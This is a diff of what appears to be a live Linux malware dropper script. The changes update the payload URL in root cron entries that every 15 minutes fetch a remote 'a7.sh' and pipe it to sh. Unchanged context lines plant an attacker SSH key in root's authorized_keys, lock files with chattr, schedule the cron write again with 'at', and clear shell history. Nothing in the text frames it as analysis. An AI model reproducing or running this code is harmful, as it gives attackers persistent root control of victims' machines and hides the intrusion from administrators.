@@ -7,7 +7,7 @@ chattr -i /etc/x7/bin/x7
 chattr -i /var/spool/cron/root
 rm -rf /var/spool/cron/root
 touch /var/spool/cron/root
-echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/9017/mini/master/a7.sh |sh" > /var/spool/cron/root
+echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/9018/9017/master/a7.sh |sh" > /var/spool/cron/root
 yum remove wget -y
 yum install wget -y
 chattr -i /root/.ssh/authorized_keys
@@ -188,7 +188,7 @@ touch /root/.ssh/authorized_keys
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxrBrcpNlLpxz9hmeIY57Ia7/yhEmSqmbDA6w4gDcGcgbmbmVOeoBJvcqDiSxBNho9MfilXPpialmLYr0UCfgHxGjQB8jyHWGI2DfbLLDdP6tPfs7r0F08vY7yVkyh39dKliK/Dlx5tIXzI3t1I7FUkvHm4oPWe5S/6snbLRwCKuwT23o/hZoCuKI7+kdxkZ//UsilHFW0JCs1rdjKFtxCz3hxT3xfK8h4urer0B/hbWNap/rTibRq3UqbIXwMYTgTcKESjS8x10UJzDqKIRqMeJWmsPN4+cLkntgnWi9uuWsmYoLHhFQehOlI4oGImG6vb11K+zEtRvg8UAg3wJ4t root@host.localdomain" > /root/.ssh/authorized_keys
 chattr +i /root/.ssh/authorized_keys
 chattr +i /etc/x7/bin/x7
-echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/9017/mini/master/a7.sh |sh" > /var/spool/cron/root | at now + 16 minutes
+echo "*/15 * * * * curl -fsSL https://raw.githubusercontent.com/9018/9017/master/a7.sh |sh" > /var/spool/cron/root | at now + 16 minutes
 clean
 history -c
 exit 0
